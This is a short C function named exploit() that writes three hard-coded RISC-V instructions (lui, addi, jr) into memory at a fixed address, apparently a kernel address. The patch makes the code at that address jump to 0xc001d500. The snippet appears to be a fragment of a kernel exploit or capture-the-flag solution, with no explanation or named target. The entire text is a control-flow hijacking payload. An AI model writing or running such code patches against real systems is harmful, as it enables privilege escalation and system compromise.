void exploit() {
    int *patch_point = (int *)0xc0025aa0;
    patch_point[0] = 0xc001d537; // lui	a0,0xc001d
    patch_point[1] = 0x50050513; // addi a0,a0,1280 # 0xc001d500
    patch_point[2] = 0x00050067; // jr a0
}
